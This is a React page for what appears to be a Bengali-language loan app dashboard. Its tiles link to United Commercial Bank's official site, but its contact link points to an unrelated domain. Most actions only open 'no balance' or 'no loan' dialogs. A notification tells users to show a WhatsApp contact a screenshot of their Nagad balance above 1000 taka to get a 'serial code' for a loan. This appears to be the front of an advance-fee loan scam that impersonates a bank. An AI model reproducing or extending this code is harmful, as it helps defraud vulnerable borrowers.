import { useState } from "react";
import { useNavigate, Navigate } from "react-router-dom";
import { useAuth } from "@/hooks/useAuth";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import {
  Banknote, HandCoins, PiggyBank, Wallet, ListChecks, History, FileClock, UserCircle2,
  Clock, Globe, Bell, Info, MessageCircle, Home, Wallet2, Inbox, MoreHorizontal, LogOut
} from "lucide-react";

type ModalKey = null | "balance" | "cashout" | "noLoan" | "notification";

export default function Index() {
  const { user, profile, loading } = useAuth();
  const nav = useNavigate();
  const [modal, setModal] = useState<ModalKey>(null);

  if (loading) return <div className="min-h-screen flex items-center justify-center">লোড হচ্ছে...</div>;
  if (!user) return <Navigate to="/auth" replace />;

  const logout = async () => { await supabase.auth.signOut(); nav("/auth"); };

  const tile = (Icon: any, label: string, color: string, onClick: () => void) => (
    <button onClick={onClick} className="flex flex-col items-center gap-2 p-2 rounded-xl hover:bg-muted/60 transition">
      <div className={`w-14 h-14 rounded-2xl flex items-center justify-center ${color}`}>
        <Icon className="w-7 h-7 text-white" />
      </div>
      <span className="text-xs font-semibold text-center">{label}</span>
    </button>
  );

  const bottomItem = (Icon: any, label: string, active = false) => (
    <div className={`flex flex-col items-center gap-1 ${active ? "text-accent" : "text-muted-foreground"}`}>
      <Icon className="w-5 h-5" /><span className="text-[11px]">{label}</span>
    </div>
  );

  return (
    <div className="min-h-screen bg-muted/30 pb-20">
      {/* Header */}
      <header className="bg-primary px-4 pt-4 pb-6 rounded-b-3xl">
        <div className="flex items-center gap-3">
          <div className="w-14 h-14 rounded-full bg-white flex items-center justify-center text-xl font-black text-primary">U</div>
          <div className="flex-1">
            <div className="font-bold text-lg text-primary-foreground">{profile?.full_name || "User"}</div>
            <div className="text-sm text-primary-foreground/80">{profile?.phone}</div>
          </div>
          <Button onClick={() => setModal("balance")} className="bg-accent text-accent-foreground hover:bg-accent/90 rounded-full">
            ব্যালেন্স
          </Button>
        </div>
      </header>

      {/* Grid */}
      <section className="bg-card mx-3 -mt-4 rounded-2xl shadow p-4 grid grid-cols-4 gap-3">
        {tile(Banknote, "লোন", "bg-emerald-500", () => nav("/loan"))}
        {tile(HandCoins, "ক্যাশ আউট", "bg-orange-500", () => setModal("cashout"))}
        {tile(PiggyBank, "জমা দিন", "bg-rose-500", () => setModal("noLoan"))}
        {tile(Wallet, "আমার লোন", "bg-violet-500", () => setModal("noLoan"))}
        {tile(ListChecks, "লেনদেন সমূহ", "bg-sky-500", () => setModal("noLoan"))}
        {tile(History, "লোন হিস্ট্রি", "bg-purple-500", () => setModal("noLoan"))}
        {tile(FileClock, "ক্যাশ আউট হিস্ট্রি", "bg-amber-500", () => setModal("noLoan"))}
        {tile(UserCircle2, "প্রোফাইল", "bg-blue-600", () => {})}
        {tile(Clock, "জমা হিস্ট্রি", "bg-orange-400", () => setModal("noLoan"))}
      </section>

      {/* About */}
      <section className="px-4 mt-6">
        <h3 className="text-accent font-bold mb-3">আমাদের সম্পর্কে</h3>
        <div className="grid grid-cols-4 gap-3 bg-card rounded-2xl shadow p-4">
          {tile(Globe, "অফিসিয়াল সাইট", "bg-sky-600", () => window.open("https://www.ucb.com.bd", "_blank"))}
          {tile(Bell, "নোটিফিকেশন", "bg-amber-500", () => setModal("notification"))}
          {tile(Info, "সম্পর্কে", "bg-rose-500", () => window.open("https://www.ucb.com.bd/banking/retail-banking/personal-loan", "_blank"))}
          {tile(MessageCircle, "যোগাযোগ", "bg-emerald-500", () => window.open("https://bdt.dollarx.top/about/", "_blank"))}
        </div>
      </section>

      <button onClick={logout} className="mx-auto mt-6 flex items-center gap-2 text-sm text-destructive">
        <LogOut className="w-4 h-4" /> লগ আউট
      </button>

      {/* Bottom nav */}
      <nav className="fixed bottom-0 inset-x-0 bg-card border-t flex justify-around py-2">
        {bottomItem(Home, "হোম", true)}
        {bottomItem(History, "হিস্টরি")}
        {bottomItem(Wallet2, "অ্যাকাউন্ট")}
        {bottomItem(Inbox, "ইনবক্স")}
        {bottomItem(MoreHorizontal, "আরো")}
      </nav>

      {/* Modals */}
      <Dialog open={modal === "balance"} onOpenChange={(o) => !o && setModal(null)}>
        <DialogContent>
          <DialogHeader><DialogTitle>আপনার ব্যালেন্স</DialogTitle></DialogHeader>
          <div className="text-4xl font-black text-center text-primary py-4">৳{(profile?.balance ?? 0).toFixed(2)}</div>
        </DialogContent>
      </Dialog>

      <Dialog open={modal === "cashout"} onOpenChange={(o) => !o && setModal(null)}>
        <DialogContent>
          <DialogHeader><DialogTitle>ক্যাশ আউট</DialogTitle>
          <DialogDescription>আপনার একাউন্টে ব্যালেন্স নেই।</DialogDescription></DialogHeader>
        </DialogContent>
      </Dialog>

      <Dialog open={modal === "noLoan"} onOpenChange={(o) => !o && setModal(null)}>
        <DialogContent>
          <DialogHeader><DialogTitle>তথ্য</DialogTitle>
          <DialogDescription>আপনার বর্তমানে কোনো লোন নেওয়া নেই।</DialogDescription></DialogHeader>
        </DialogContent>
      </Dialog>

      <Dialog open={modal === "notification"} onOpenChange={(o) => !o && setModal(null)}>
        <DialogContent>
          <DialogHeader><DialogTitle>নোটিফিকেশন</DialogTitle>
          <DialogDescription className="text-foreground leading-relaxed pt-2">
            লোন নিতে হলে আপনার নগদে ১০০০ টাকার উপরে ব্যালেন্স থাকতে হবে। আমাদের সাথে হোয়াটসঅ্যাপে যোগাযোগ করে আপনার নগদে ১০০০ টাকার বেশি আছে এটা স্কিনশট দিয়ে দেখিয়ে একটা সিরিয়াল কোড নিতে হবে সেটা ব্যবহার করে লোন নিতে পারবেন।
          </DialogDescription></DialogHeader>
        </DialogContent>
      </Dialog>
    </div>
  );
}
